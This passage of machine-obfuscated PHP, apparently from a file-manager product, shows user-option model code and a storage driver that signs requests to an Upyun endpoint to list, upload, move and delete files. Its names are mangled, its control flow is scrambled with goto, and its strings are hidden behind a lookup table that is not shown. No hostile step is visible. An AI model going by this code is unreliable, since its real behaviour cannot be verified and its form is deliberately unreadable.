array_to_keyvalue($BÈ’Šö™“ê, $eï„Ó‹ã‰À[33], $eï„Ó‹ã‰À[1650]); $D‘ÔœŠºö– = array_remove_value(array_unique($D‘ÔœŠºö–), $eï„Ó‹ã‰À[500]); if (!$D‘ÔœŠºö– || !$BÈ’Šö™“ê) { return; } goto e¾¢ÕŠ¥; e¾¢ÕŠ¥: $AµËÅ ÑÛ = array($eï„Ó‹ã‰À[1650] => array($eï„Ó‹ã‰À[7], $D‘ÔœŠºö–)); $d‰¼²ç×¡Ô = Model($eï„Ó‹ã‰À[1823])->field($eï„Ó‹ã‰À[2113])->where($AµËÅ ÑÛ)->select(); $d‰¼²ç×¡Ô = array_to_keyvalue($d‰¼²ç×¡Ô, $eï„Ó‹ã‰À[1650]); goto eñÍîŞ®‚; Cƒ†„†“ï: foreach ($dö›ƒÑöŒ as &$aíØÓŒ¬ö‚) { $aíØÓŒ¬ö‚[$eï„Ó‹ã‰À[1825]] = array(); if (isset($BÈ’Šö™“ê[$aíØÓŒ¬ö‚[$eï„Ó‹ã‰À[1487]]])) { $aíØÓŒ¬ö‚[$eï„Ó‹ã‰À[1825]] = $BÈ’Šö™“ê[$aíØÓŒ¬ö‚[$eï„Ó‹ã‰À[1487]]]; } } unset($aíØÓŒ¬ö‚); goto FÊÈÁ–“‡á; FÊÈÁ–“‡á: } private function _listAppendMeta(&$CÃƒíéÜŒè, $BÌãš· ¿¿) { goto eÄÂ™ââÈ±; Dİ¨éï«µÄ: foreach ($CÃƒíéÜŒè as &$A‹ãÆÛŠÍÚ) { $dïÑá»—Œ = array(); if (isset($d·äğ‘£¿Á[$A‹ãÆÛŠÍÚ[$fì†ÌøèÉ…[1487]]])) { $dïÑá»—Œ = $d·äğ‘£¿Á[$A‹ãÆÛŠÍÚ[$fì†ÌøèÉ…[1487]]]; } $A‹ãÆÛŠÍÚ[$fì†ÌøèÉ…[2116]] = array(); if (isset($dïÑá»—Œ[$c‘İµˆˆÀˆ])) { $A‹ãÆÛŠÍÚ[$fì†ÌøèÉ…[2116]] = $f¸Û¶Ù²º->getUserJobInfo($dïÑá»—Œ[$c‘İµˆˆÀˆ]); } } unset($A‹ãÆÛŠÍÚ); goto cÙç‘¬¹À’; Dó—§¾Ì„ã: foreach ($d·äğ‘£¿Á as &$aíŒ°ø¸) { $A „®éÇíØ = array(); foreach ($aíŒ°ø¸ as $FØ˜ÉƒÌ›) { if (!in_array($FØ˜ÉƒÌ›[$fì†ÌøèÉ…[102]], $c†¥©„òä)) { $A „®éÇíØ[$FØ˜ÉƒÌ›[$fì†ÌøèÉ…[102]]] = $FØ˜ÉƒÌ›[$fì†ÌøèÉ…[380]]; } } $aíŒ°ø¸ = $A „®éÇíØ; } unset($aíŒ°ø¸); $f¸Û¶Ù²º = Model($fì†ÌøèÉ…[2115]); goto Dİ¨éï«µÄ; eÚ¹ƒ: $CÊ¬„†²ˆí = array($fì†ÌøèÉ…[1487] => array($fì†ÌøèÉ…[7], $BÌãš· ¿¿)); $d·äğ‘£¿Á = Model($fì†ÌøèÉ…[2091])->where($CÊ¬„†²ˆí)->select(); $d·äğ‘£¿Á = array_to_keyvalue_group($d·äğ‘£¿Á, $fì†ÌøèÉ…[1487]); goto Dó—§¾Ì„ã; eÄÂ™ââÈ±: $fì†ÌøèÉ… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c‘İµˆˆÀˆ = UserJobModel::JOB_KEY; $c†¥©„òä = array($fì†ÌøèÉ…[2093]); goto eÚ¹ƒ; cÙç‘¬¹À’: } protected function groupUserAll($f´¾ÊÚø—) { $cŠ„½Ÿ¶‰ñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$f´¾ÊÚø—) { return !1; } $e„â¤ö¾Ú = Model($cŠ„½Ÿ¶‰ñ[1732])->field($cŠ„½Ÿ¶‰ñ[1487])->where(array($cŠ„½Ÿ¶‰ñ[1650] => array($cŠ„½Ÿ¶‰ñ[7], $f´¾ÊÚø—)))->select(); $e„â¤ö¾Ú = array_to_keyvalue($e„â¤ö¾Ú, $cŠ„½Ÿ¶‰ñ[33], $cŠ„½Ÿ¶‰ñ[1487]); return array_unique($e„â¤ö¾Ú); } public function userSearch($C¦ñù‰Ïš, $Aò¸ÅíŠâÄ = "\x2a") { return Model($_SERVER[í¤âËÚ£¶íÊ¢][510])->where($C¦ñù‰Ïš)->field($Aò¸ÅíŠâÄ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\x5f\x6f\x70\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cê¶«¹Ì¯”) { $Bˆ¾»£Â²ª =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!defined($Bˆ¾»£Â²ª[457])) { define($Bˆ¾»£Â²ª[457], 0); } return "\x55\163\x65\162\x4f\160\164\x69\x6f\156\137{$cê¶«¹Ì¯”}\x5f" . USER_ID; } protected function filterWhere($Fæ“Åˆç) { $e–ŸªÖÙŞÊ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!defined($e–ŸªÖÙŞÊ[457])) { define($e–ŸªÖÙŞÊ[457], 0); } $Fæ“Åˆç[$e–ŸªÖÙŞÊ[1487]] = USER_ID; return $Fæ“Åˆç; } public function cacheRemoveUser($bæÁ·ÚÎÒ, $F„íšÉ™Ğ‘) { return Cache::remove("\125\163\x65\x72\x4f\160\x74\151\x6f\156\x5f{$bæÁ·ÚÎÒ}\x5f" . $F„íšÉ™Ğ‘); } protected function optionDefault($fóÁŞË­ÏÈ = '') { $b±Ÿ‚ŸŞËË =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($fóÁŞË­ÏÈ == $b±Ÿ‚ŸŞËË[33]) { return $GLOBALS[$b±Ÿ‚ŸŞËË[6]][$b±Ÿ‚ŸŞËË[2117]]; } if ($fóÁŞË­ÏÈ == $b±Ÿ‚ŸŞËË[2118]) { return $GLOBALS[$b±Ÿ‚ŸŞËË[6]][$b±Ÿ‚ŸŞËË[2119]]; } } } goto A½¯›ÆëÆ; d½º†òš·: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\x3a\57\57\x76\60\x2e\141\160\x69\x2e\165\160\x79\165\x6e\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($c ´ƒÔ™ßó) { parent::__construct(); $this->_init($c ´ƒÔ™ßó); } public function _init($cÂ÷ì¨’¤) { $bİ—õŒ˜°” =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($cÂ÷ì¨’¤ as $bÅ…†ƒÎµ => $AÔ£ÓîÁÄÕ) { if (isset($this->{$bÅ…†ƒÎµ})) { $this->{$bÅ…†ƒÎµ} = $AÔ£ÓîÁÄÕ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($bİ—õŒ˜°”[1289] . LNG($bİ—õŒ˜°”[1221])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Bœˆä¸Ñ÷, $a¯İŠ¸¯‘Ÿ = "\x47\x45\x54") { $eøÔÌ¼ÎÌù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A¦—©ÂŞìÎ = gmdate($eøÔÌ¼ÎÌù[1255]); $c×ãİß–äº = base64_encode(hash_hmac($eøÔÌ¼ÎÌù[1290], "{$a¯İŠ¸¯‘Ÿ}\46{$Bœˆä¸Ñ÷}\x26{$A¦—©ÂŞìÎ}", md5("{$this->userpass}"), !0)); $Dî¨‡«é©Ñ = array("\101\x75\164\150\x6f\x72\151\x7a\141\164\151\x6f\x6e\x3a\x55\x50\x59\125\116\x20{$this->username}\72{$c×ãİß–äº}", "\x44\x61\164\x65\72{$A¦—©ÂŞìÎ}"); return $Dî¨‡«é©Ñ; } public function ussRequest($BšÕÇÓá•×, $C—ƒ¤ ƒñ» = "\x47\x45\124", $CİºêÑ¨áŠ = false, $bİİâ÷ÂÇ = false, $bäè˜ß©î‘ = false) { goto BÀÓ’Œ£Ñ¾; bŞŞ‹­Îë¡: if (!$d«¶Ò¾¶Å¨) { return array($cÖªÄÈ£÷ä[1046] => !1, $cÖªÄÈ£÷ä[1048] => $cÖªÄÈ£÷ä[1291]); } if (strtolower($C—ƒ¤ ƒñ») == $cÖªÄÈ£÷ä[199] || in_array($d«¶Ò¾¶Å¨[$cÖªÄÈ£÷ä[1046]], array($cÖªÄÈ£÷ä[1147], $cÖªÄÈ£÷ä[1292]))) { $CİºêÑ¨áŠ = $d«¶Ò¾¶Å¨[$cÖªÄÈ£÷ä[1293]]; } else { $CİºêÑ¨áŠ = json_decode($d«¶Ò¾¶Å¨[$cÖªÄÈ£÷ä[1048]], !0); if (!$CİºêÑ¨áŠ) { $CİºêÑ¨áŠ = $d«¶Ò¾¶Å¨[$cÖªÄÈ£÷ä[1048]]; } else { if (!$d«¶Ò¾¶Å¨[$cÖªÄÈ£÷ä[694]] && isset($CİºêÑ¨áŠ[$cÖªÄÈ£÷ä[1294]])) { $CİºêÑ¨áŠ = $CİºêÑ¨áŠ[$cÖªÄÈ£÷ä[1294]]; } } } return array($cÖªÄÈ£÷ä[1046] => $d«¶Ò¾¶Å¨[$cÖªÄÈ£÷ä[694]], $cÖªÄÈ£÷ä[1048] => $CİºêÑ¨áŠ); goto Aâ¥ã°·Ë†; fŠ¨Ÿˆâ„: $Cˆ»®õÂ¬ = $this->ussHeaders($Ağôòò²ÚÇ, $C—ƒ¤ ƒñ»); if ($bİİâ÷ÂÇ) { $Cˆ»®õÂ¬ = array_merge($Cˆ»®õÂ¬, $bİİâ÷ÂÇ); } $d«¶Ò¾¶Å¨ = url_request($this->endpoint . $Ağôòò²ÚÇ, $C—ƒ¤ ƒñ», $CİºêÑ¨áŠ, $Cˆ»®õÂ¬, $bäè˜ß©î‘); goto bŞŞ‹­Îë¡; BÀÓ’Œ£Ñ¾: $cÖªÄÈ£÷ä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BšÕÇÓá•× = trim($BšÕÇÓá•×, $cÖªÄÈ£÷ä[8]); $Ağôòò²ÚÇ = "\57{$this->bucket}\x2f{$BšÕÇÓá•×}"; goto fŠ¨Ÿˆâ„; Aâ¥ã°·Ë†: } public function mkfile($F…‡­ÉŠªç, $BºğÇö¢÷Á = '', $c²ƒâ‘â×í = REPEAT_RENAME) { if ($this->setContent($F…‡­ÉŠªç, $BºğÇö¢÷Á)) { return $this->getPathOuter($F…‡­ÉŠªç); } return !1; } public function mkdir($A‚Áê¡¶», $cÍâ‡ÜÌÅÑ = REPEAT_SKIP) { $aáÀµİ—¨˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Bâ©¸¶ÏÄ = trim($A‚Áê¡¶», $aáÀµİ—¨˜[8]); if ($this->_isFolder($Bâ©¸¶ÏÄ)) { return $this->getPathOuter($Bâ©¸¶ÏÄ); } $Bñ¯ Á™â§ = array($aáÀµİ—¨˜[1295]); $B¼½ÖµÓæ = $this->ussRequest($Bâ©¸¶ÏÄ, $aáÀµİ—¨˜[232], !1, $Bñ¯ Á™â§); return $B¼½ÖµÓæ[$aáÀµİ—¨˜[1046]] ? $this->getPathOuter($Bâ©¸¶ÏÄ) : !1; } public function copyFile($aë®ò¤È‡Ü, $d…‹êæÈ¼) { $CÖ…ùîºâ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÌëó‡àš = array($CÖ…ùîºâ[1296] . "\x2f{$this->bucket}\57{$aë®ò¤È‡Ü}", $CÖ…ùîºâ[1297]); $c‘Œ¿‡İ = $this->ussRequest($d…‹êæÈ¼, $CÖ…ùîºâ[234], !1, $BÌëó‡àš); return $c‘Œ¿‡İ[$CÖ…ùîºâ[1046]] ? !0 : $this->getPathOuter($d…‹êæÈ¼); } public function moveFile($Dİì’Äõ¤¬, $B­§“À¤ÏÊ) { $b±ÛÔÌ¤ñ£ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÆ†¸ÚÓê“ = array($b±ÛÔÌ¤ñ£[1298] . "\57{$this->bucket}\x2f{$Dİì’Äõ¤¬}", $b±ÛÔÌ¤ñ£[1297]); $ağÓÔ†Ä÷® = $this->ussRequest($B­§“À¤ÏÊ, $b±ÛÔÌ¤ñ£[234], !1, $eÆ†¸ÚÓê“); return $ağÓÔ†Ä÷®[$b±ÛÔÌ¤ñ£[1046]] ? !0 : $this->getPathOuter($B­§“À¤ÏÊ); } public function delFile($añÅßĞğ‹Î) { $aØòÄø‘ƒß =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f›ÕÀ¥Ìâ¬ = $this->ussRequest($añÅßĞğ‹Î, $aØòÄø‘ƒß[1299]); return $f›ÕÀ¥Ìâ¬[$aØòÄø‘ƒß[1046]] ? !0 : !1; } public function delFolder($e–Õ³ƒ‰†¬) { goto F®îìàñ¯Õ; F®îìàñ¯Õ: $c ‰Ø…œÑ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->exist($e–Õ³ƒ‰†¬)) { return !0; } $this->listItemCache = !1; goto dÙÛÙÊ¨î‘; dÙÛÙÊ¨î‘: $A×‚êñ¹‘å = $bí˜ïÜ”³é = array(); $this->fileList($e–Õ³ƒ‰†¬, $A×‚êñ¹‘å, $bí˜ïÜ”³é, !0); $this->listItemCache = !0; goto F×‰«†â»Ÿ; C°™×È‹ëŠ: return $bÄº‰ªÖ–”[$c ‰Ø…œÑ[1046]]; goto AÄ§»Â›Ş¥; F×‰«†â»Ÿ: foreach ($bí˜ïÜ”³é as $C•§ä´ÛÍŞ) { $bÄº‰ªÖ–” = $this->ussRequest($C•§ä´ÛÍŞ[$c ‰Ø…œÑ[28]], $c ‰Ø…œÑ[1299]); if (!$bÄº‰ªÖ–”[$c ‰Ø…œÑ[1046]]) { return !1; } } foreach ($A×‚êñ¹‘å as $D‹Ù‹¼¬ßÑ) { $bÄº‰ªÖ–” = $this->ussRequest($D‹Ù‹¼¬ßÑ, $c ‰Ø…œÑ[1299]); if (!$bÄº‰ªÖ–”[$c ‰Ø…œÑ[1046]]) { return !1; } } $bÄº‰ªÖ–” = $this->ussRequest($e–Õ³ƒ‰†¬, $c ‰Ø…œÑ[1299]); goto C°™×È‹ëŠ; AÄ§»Â›Ş¥: } public function rename($B¨­æ‚ä›‚, $e´İ°ÈŒà) { if ($this->isFile($B¨­æ‚ä›‚)) { $e´İ°ÈŒà = get_path_father($B¨­æ‚ä›‚) . $e´İ°ÈŒà; return $this->moveFile($B¨­æ‚ä›‚, $e´İ°ÈŒà); } return $this->renameObject($B¨­æ‚ä›‚, $e´İ°ÈŒà); } public function fileInfo($D±³‘‰—¡ã, $d¯¬œÑ— = false, $F‰ĞåŞ¬ó« = array()) { goto A‘Â‚Ô»å¢; f»æÌ”ĞÑğ: $aá÷›‘èŸï[$B¢Ëƒ±´„î[202]] = $aá÷›‘èŸï[$B¢Ëƒ±´„î[93]] = 0; $aá÷›‘èŸï[$B¢Ëƒ±´„î[203]] = $aá÷›‘èŸï[$B¢Ëƒ±´„î[204]] = !0; if (empty($F‰ĞåŞ¬ó«)) { $F‰ĞåŞ¬ó« = $this->objectMeta($D±³‘‰—¡ã); if (!$F‰ĞåŞ¬ó«) { return $aá÷›‘èŸï; } } goto c÷”âÔ†©; c÷”âÔ†©: $aá÷›‘èŸï[$B¢Ëƒ±´„î[202]] = intval($F‰ĞåŞ¬ó«[$B¢Ëƒ±´„î[1300]]); $aá÷›‘èŸï[$B¢Ëƒ±´„î[93]] = intval($F‰ĞåŞ¬ó«[$B¢Ëƒ±´„î[1301]]); $aá÷›‘èŸï[$B¢Ëƒ±´„î[87]] = $F‰ĞåŞ¬ó«[$B¢Ëƒ±´„î[87]]; goto Dæˆƒ‘‡§Ô; Dæˆƒ‘‡§Ô: return $aá÷›‘èŸï; goto D—Ò¸¢èá; A‘Â‚Ô»å¢: $B¢Ëƒ±´„î =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aá÷›‘èŸï = array($B¢Ëƒ±´„î[28] => $this->pathThis($D±³‘‰—¡ã), $B¢Ëƒ±´„î[85] => $this->getPathOuter($B¢Ëƒ±´„î[8] . $D±³‘‰—¡ã), $B¢Ëƒ±´„î[29] => $B¢Ëƒ±´„î[201], $B¢Ëƒ±´„î[87] => isset($F‰ĞåŞ¬ó«[$B¢Ëƒ±´„î[87]]) ? $F‰ĞåŞ¬ó«[$B¢Ëƒ±´„î[87]] : 0, $B¢Ëƒ±´„î[177] => $this->ext($D±³‘‰—¡ã)); if ($d¯¬œÑ—) { return $aá÷›‘èŸï; } goto f»æÌ”ĞÑğ; D—Ò¸¢èá: } public function folderInfo($eÙ¡©Ç¹éĞ, $C¦Ÿ×Ô = false) { goto F†ª­àÛ¨À; d¼êŒ†¯‡: $Cñô„ô‹Ğ…[$BĞˆ‘‹¶İ¾[202]] = $Cñô„ô‹Ğ…[$BĞˆ‘‹¶İ¾[93]] = 0; $Cñô„ô‹Ğ…[$BĞˆ‘‹¶İ¾[203]] = $Cñô„ô‹Ğ…[$BĞˆ‘‹¶İ¾[204]] = !0; if (empty($CƒåÔßùÄ)) { $CƒåÔßùÄ = $this->objectMeta($eÙ¡©Ç¹éĞ); if (!$CƒåÔßùÄ) { return $Cñô„ô‹Ğ…; } } goto aÏ§áğšµó; F†ª­àÛ¨À: $BĞˆ‘‹¶İ¾ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Cñô„ô‹Ğ… = array($BĞˆ‘‹¶İ¾[28] => $this->pathThis($eÙ¡©Ç¹éĞ), $BĞˆ‘‹¶İ¾[85] => $this->getPathOuter($BĞˆ‘‹¶İ¾[8] . $eÙ¡©Ç¹éĞ), $BĞˆ‘‹¶İ¾[29] => $BĞˆ‘‹¶İ¾[86]); if ($C¦Ÿ×Ô) { return $Cñô„ô‹Ğ…; } goto d¼êŒ†¯‡; aÏ§áğšµó: $Cñô„ô‹Ğ…[$BĞˆ‘‹¶İ¾[202]] = intval($CƒåÔßùÄ[$BĞˆ‘‹¶İ¾[1300]]); $Cñô„ô‹Ğ…[$BĞˆ‘‹¶İ¾[93]] = intval($CƒåÔßùÄ[$BĞˆ‘‹¶İ¾[1301]]); return $Cñô„ô‹Ğ…; goto F³ÎÂ’±; F³ÎÂ’±: } private function listObjs($B†æ™ÃÉ™â, $Fƒê†ùŸ¨š = 0, $DÖÊ ïçÓË = 1000) { $c¤œ¾¹„œº =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e´©¡ô ¤Ã = array($c¤œ¾¹„œº[1302], $c¤œ¾¹„œº[1303] . $DÖÊ ïçÓË); if ($Fƒê†ùŸ¨š) { $e´©¡ô ¤Ã[] = $c¤œ¾¹„œº[1304] . $Fƒê†ùŸ¨š; } $dºŒİÃßÎç = $this->ussRequest($B†æ™ÃÉ™â, $c¤œ¾¹„œº[236], !1, $e´©¡ô ¤Ã); return !$dºŒİÃßÎç[$c¤œ¾¹„œº[1046]] ? !1 : $dºŒİÃßÎç[$c¤œ¾¹„œº[1048]]; } private function fileList($A™¶’À«ïÃ, &$Bî»ğ¥ß×µ, &$E§‘ô·Õ÷ö, $Aáé÷ß²Òˆ = false) { goto cğç¿†‹ì; D‚º×¾ÒÁ: if ($cİ¶‘ÇÂ) { $this->cacheMethod($DŠæøÒ—çâ[207], $A™¶’À«ïÃ, !0); } goto eáªÔõŠ¸Ë; cğç¿†‹ì: $DŠæøÒ—çâ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FñÍ¯ê ù¤ = $DŠæøÒ—çâ[33]; $a¢ÊÇ¿Àç = 1000; goto eªÍèæ±Õ‡; eªÍèæ±Õ‡: $E˜Åƒ‰ˆ×È = rtrim($A™¶’À«ïÃ, $DŠæøÒ—çâ[8]) . $DŠæøÒ—çâ[8]; $cİ¶‘ÇÂ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $eö»¶ßá› = $this->listObjs($A™¶’À«ïÃ, $FñÍ¯ê ù¤, $a¢ÊÇ¿Àç); if (!$eö»¶ßá›) { return !1; } $FñÍ¯ê ù¤ = isset($eö»¶ßá›[$DŠæøÒ—çâ[1305]]) ? $eö»¶ßá›[$DŠæøÒ—çâ[1305]] : $DŠæøÒ—çâ[33]; $Dó¸³¯›Ò• = isset($eö»¶ßá›[$DŠæøÒ—çâ[1306]]) ? $eö»¶ßá›[$DŠæøÒ—çâ[1306]] : array(); foreach ($Dó¸³¯›Ò• as $DêŞ‡ó‚º‚) { $fŠ¢ğäÀ‘” = $DêŞ‡ó‚º‚[$DŠæøÒ—çâ[29]] == $DŠæøÒ—çâ[86] ? !0 : !1; $fÌßÈ”ÀÓî = ltrim($E˜Åƒ‰ˆ×È . $DêŞ‡ó‚º‚[$DŠæøÒ—çâ[28]], $DŠæøÒ—çâ[8]) . ($fŠ¢ğäÀ‘” ? $DŠæøÒ—çâ[8] : $DŠæøÒ—çâ[33]); $a×‹ËöŠæ = array($DŠæøÒ—çâ[28] => $fÌßÈ”ÀÓî, $DŠæøÒ—çâ[29] => $fŠ¢ğäÀ‘” ? $DŠæøÒ—çâ[86] : $DŠæøÒ—çâ[201], $DŠæøÒ—çâ[87] => $DêŞ‡ó‚º‚[$DŠæøÒ—çâ[342]], $DŠæøÒ—çâ[1301] => $DêŞ‡ó‚º‚[$DŠæøÒ—çâ[1307]]); if ($cİ¶‘ÇÂ) { $this->cacheMethod($DŠæøÒ—çâ[207], $fÌßÈ”ÀÓî, $fŠ¢ğäÀ‘”); $this->cacheMethod($DŠæøÒ—çâ[208], $fÌßÈ”ÀÓî, $a×‹ËöŠæ); } if ($fŠ¢ğäÀ‘”) { $Bî»ğ¥ß×µ[] = $fÌßÈ”ÀÓî; if ($Aáé÷ß²Òˆ) { $this->fileList($fÌßÈ”ÀÓî, $Bî»ğ¥ß×µ, $E§‘ô·Õ÷ö, $Aáé÷ß²Òˆ); } continue; } $E§‘ô·Õ÷ö[] = $a×‹ËöŠæ; } if (count($Dó¸³¯›Ò•) < $a¢ÊÇ¿Àç) { break; } } goto D‚º×¾ÒÁ; eáªÔõŠ¸Ë: } public function listPath($CÃã¿÷Ã¼, $Bì†ºÏî³º = false) { $A•³ªßå± =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FäÍª™ğ‚¦ = $B™Ó’˜Û¶… = array(); $this->fileList($CÃã¿÷Ã¼, $FäÍª™ğ‚¦, $B™Ó’˜Û¶…); foreach ($FäÍª™ğ‚¦ as $CƒÚ¤Çç => $d¤ÛÌª¤œÜ) { $FäÍª™ğ‚¦[$CƒÚ¤Çç] = $this->folderInfo($d¤ÛÌª¤œÜ, $Bì†ºÏî³º); } foreach ($B™Ó’˜Û¶… as $CƒÚ¤Çç => $d¤ÛÌª¤œÜ) { $B™Ó’˜Û¶…[$CƒÚ¤Çç] = $this->fileInfo($d¤ÛÌª¤œÜ[$A•³ªßå±[28]], $Bì†ºÏî³º, $d¤ÛÌª¤œÜ); } return array($A•³ªßå±[84] => $FäÍª™ğ‚¦, $A•³ªßå±[83] => $B™Ó’˜Û¶…); } public function has($a–ÇëŒ¨ˆ®, $eé‹³‰ŠÜ = false, $BÅé‡”Íˆœ = true) { goto c¦ÔíòÌ¡; DòÀíƒõ¬´: $cø©Œ¹± = 0; $E»±¡éõ¬¯ = 0; $aîÙš„ÉÇŒ = rtrim($a–ÇëŒ¨ˆ®, $e„Æàê¤ö [8]) . $e„Æàê¤ö [8]; goto aãÁ«Ê•Ñá; c¦ÔíòÌ¡: $e„Æàê¤ö  =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÀÆÙ´ÔÖ = $e„Æàê¤ö [33]; $A¶µÔ¶Áñ = 500; goto DòÀíƒõ¬´; aãÁ«Ê•Ñá: while (!0) { check_abort(); $däø†æÙò = $this->listObjs($a–ÇëŒ¨ˆ®, $dÀÆÙ´ÔÖ, $A¶µÔ¶Áñ); if (!$däø†æÙò) { return !1; } $dÀÆÙ´ÔÖ = isset($däø†æÙò[$e„Æàê¤ö [1305]]) ? $däø†æÙò[$e„Æàê¤ö [1305]] : $e„Æàê¤ö [33]; $CÉ“®ïäÃ = isset($däø†æÙò[$e„Æàê¤ö [1306]]) ? $däø†æÙò[$e„Æàê¤ö [1306]] : array(); if (empty($CÉ“®ïäÃ)) { break; } $bµ«¹Ù«¥Î = array_filter($CÉ“®ïäÃ, function ($aËÎ‰ª‰ğ‰) { $C½áÉ§°¸™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return $aËÎ‰ª‰ğ‰[$C½áÉ§°¸™[29]] == $C½áÉ§°¸™[86]; }); $dš•éË¨ïŞ = count($CÉ“®ïäÃ); $bµ«¹Ù«¥Î = count($bµ«¹Ù«¥Î); $bø”‰šŒ³â = $dš•éË¨ïŞ - $bµ«¹Ù«¥Î; if ($eé‹³‰ŠÜ) { $E»±¡éõ¬¯ += $bµ«¹Ù«¥Î; $cø©Œ¹± += $bø”‰šŒ³â; if ($dš•éË¨ïŞ < $A¶µÔ¶Áñ) { break; } continue; } if ($BÅé‡”Íˆœ) { if ($bø”‰šŒ³â) { return !0; } } else { if ($bµ«¹Ù«¥Î) { return !0; } } if ($dš•éË¨ïŞ < $A¶µÔ¶Áñ) { break; } } if ($eé‹³‰ŠÜ) { return array($e„Æàê¤ö [211] => $cø©Œ¹±, $e„Æàê¤ö [212] => $E»±¡éõ¬¯); } return !1; goto eÊ…®ÄÈÊ; eÊ…®ÄÈÊ: } public function listAll($fºêµš‘Í) { goto AÀä¶ÒÕ·×; c›¼äˆÀ: $EËˆç¸‘ãò = array(); foreach ($eÑìÂÒ¦«Ù as $a¤Ëã……ÁŸ) { $EËˆç¸‘ãò[$a¤Ëã……ÁŸ[$AòÖÊªÇã[28]]] = $a¤Ëã……ÁŸ[$AòÖÊªÇã[87]]; } foreach ($A‹Š¡Áß¥ as $a¤Ëã……ÁŸ) { if (is_string($a¤Ëã……ÁŸ)) { $EËˆç¸‘ãò[$a¤Ëã……ÁŸ] = 0; } } goto CÇ»îË£¬Ö; AÀä¶ÒÕ·×: $AòÖÊªÇã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A‹Š¡Áß¥ = $eÑìÂÒ¦«Ù = array(); $this->fileList($fºêµš‘Í, $A‹Š¡Áß¥, $eÑìÂÒ¦«Ù, !0); goto c›¼äˆÀ; CÇ»îË£¬Ö: return $this->listAllFiles($fºêµš‘Í, array_keys($EËˆç¸‘ãò), $EËˆç¸‘ãò); goto F¶•Ãˆ´; F¶•Ãˆ´: } public function canRead($eÖÛ¦Æ¢Ì) { return $this->exist($eÖÛ¦Æ¢Ì) ? !0 : !1; } public function canWrite($díÌã­§‘…) { return $this->exist($díÌã­§‘…) ? !0 : !1; } public function getContent($d‚—ù”‚Æ) { return $this->fileSubstr($d‚—ù”‚Æ, 0, -1); } public function setContent($C®¾‰¦š¸Œ, $dŠ­•ùë = '') { $BôÅËÎÕ¨ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$dŠ­•ùë) { $aÒİöĞğàŒ = $this->ussRequest($C®¾‰¦š¸Œ, $BôÅËÎÕ¨[232]); return $aÒİöĞğàŒ[$BôÅËÎÕ¨[1046]]; } $bíÁ„ãİÈå = $this->tempFile($this->pathThis($C®¾‰¦š¸Œ)); file_put_contents($bíÁ„ãİÈå, $dŠ­•ùë); if ($this->upload($C®¾‰¦š¸Œ, $bíÁ„ãİÈå)) { $this->tempFileRemve($bíÁ„ãİÈå); return !0; } return !1; } public function fileSubstr($a¢àÔ˜ä Â, $AˆÕÜİ¡Êİ, $C±‹È‰ïï) { $bÚ®·¤Ê†± =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!($dÀÊÚé¥² = $this->link($a¢àÔ˜ä Â))) { return !1; } $AºŞÊÀÔ÷ = !1; if ($C±‹È‰ïï > 0) { $a™âŒ½ŸÄ· = $AˆÕÜİ¡Êİ + $C±‹È‰ïï - 1; $AºŞÊÀÔ÷ = array($bÚ®·¤Ê†±[1268] . $AˆÕÜİ¡Êİ . $bÚ®·¤Ê†±[443] . $a™âŒ½ŸÄ·); } $DÑ‹Î™¬ = url_request($dÀÊÚé¥², $bÚ®·¤Ê†±[236], !1, $AºŞÊÀÔ÷); return $DÑ‹Î™¬[$bÚ®·¤Ê†±[694]] ? $DÑ‹Î™¬[$bÚ®·¤Ê†±[1048]] : !1; } public function upload($aî½öºæÃ“, $E”­Å¸Ğ©£, $C“–Ûª£´î = false, $aÓ›Œ ®Í = REPEAT_REPLACE) { goto e¼í±ÙšÕ“; E‘áÎß¿¸: if (!$BÒÈë‚Ä[$Cƒö´è©£Ñ[1046]]) { return !1; } $A¡‹Ëìä°ñ = $BÒÈë‚Ä[$Cƒö´è©£Ñ[1048]]; $B›Ëé˜ò§õ = 0; goto FÂÍ¢‘Öõ; C¢È’ê»ì: do { $a­ÊÃ—í = $A¡‹Ëìä°ñ[$Cƒö´è©£Ñ[1314]]; fseek_64($D¼Û—·è¿ù, $B›Ëé˜ò§õ); $cä¡Èòğä = fread($D¼Û—·è¿ù, $a­ÊÃ—í); $aÛå„÷Êƒ = 0; do { $aÛå„÷Êƒ++; $A¡‹Ëìä°ñ = $this->uploadPart($aî½öºæÃ“, $A¡‹Ëìä°ñ, $cä¡Èòğä); } while (!$A¡‹Ëìä°ñ && $aÛå„÷Êƒ < 3); if (!$A¡‹Ëìä°ñ) { return !1; } $E…²Á‡Ç Ø = $A¡‹Ëìä°ñ[$Cƒö´è©£Ñ[1313]]; $B›Ëé˜ò§õ += $a­ÊÃ—í; } while ($E…²Á‡Ç Ø != -1); fclose($D¼Û—·è¿ù); $bî–…‚à = array($Cƒö´è©£Ñ[1315], 